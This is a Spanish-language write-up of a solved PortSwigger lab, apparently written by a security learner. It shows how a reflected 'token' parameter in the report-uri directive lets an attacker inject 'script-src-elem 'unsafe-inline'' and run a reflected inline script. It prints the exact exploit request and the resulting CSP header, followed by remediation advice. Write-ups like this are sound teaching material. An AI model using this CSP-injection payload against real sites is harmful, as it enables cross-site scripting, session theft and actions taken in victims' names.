# Reflected XSS protected by CSP, with CSP bypass

## Info
- **Dificultad**: Expert
- **URL**: https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-csp-bypass
- **Fecha**: 2026-08-05
- **Estado**: SOLVED (verificado, banner "solved")
- **Nodo**: GEEKOM (100.123.17.12) — exploit ejecutado desde el nodo de lab

## Objetivo
Realizar un ataque XSS que **bypasee la CSP** y llame a `alert()`. Solo posible en Chrome.

## Reconocimiento
- La app refleja el input de búsqueda en `<h1>0 search results for 'test123'</h1>`.
- **CSP header** (verificado con curl):
  ```
  content-security-policy: default-src 'self'; object-src 'none';script-src 'self'; style-src 'self'; report-uri /csp-report?token=
  ```
- `script-src 'self'` bloquea inline scripts. Sin `unsafe-inline`.
- **Clave**: la directiva `report-uri` tiene un parámetro `token` que **controlo** (se refleja en el header).

## Vulnerabilidad
El parámetro `token` en `report-uri` se inyecta directamente en el header CSP. Al inyectar `;script-src-elem 'unsafe-inline'`, la directiva `script-src-elem` (que aplica solo a elementos `<script>`) **sobreescribe** `script-src 'self'`, permitiendo inline scripts.

## Explotación
Request (URL-encoded):
```
GET /?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27
```

**CSP resultante (verificado con curl):**
```
content-security-policy: default-src 'self'; object-src 'none';script-src 'self'; style-src 'self'; report-uri /csp-report?token=;script-src-elem 'unsafe-inline'
```

El `<script>alert(1)</script>` se refleja y ahora **ejecuta** porque `script-src-elem 'unsafe-inline'` permite inline scripts.

## Impacto
- **XSS ejecutado** a pesar de la CSP: robo de sesión, keylogging, defacement, acciones en nombre del usuario.
- El bypass demuestra que una CSP mal construida (con input controlable en `report-uri`) es peor que ninguna.

## Remediation
- **Nunca** reflejar input del usuario en directivas CSP (el `token` no debe ser controlable).
- Usar `script-src` estricto con nonces/hashes, no `unsafe-inline`.
- Validar/sanitizar el parámetro `token` (whitelist de caracteres).
- `script-src-elem` no debe poder sobreescribir `script-src`.

## Lección aprendida
- **CSP bypass via report-uri**: si el `report-uri` refleja input controlable, se pueden inyectar directivas CSP completas.
- `script-src-elem` es una directiva más específica que `script-src` — puede sobreescribirla para permitir inline.
- Para bug bounty real: revisar SIEMPRE si el header CSP refleja parámetros controlables. Es un bypass de alto impacto.
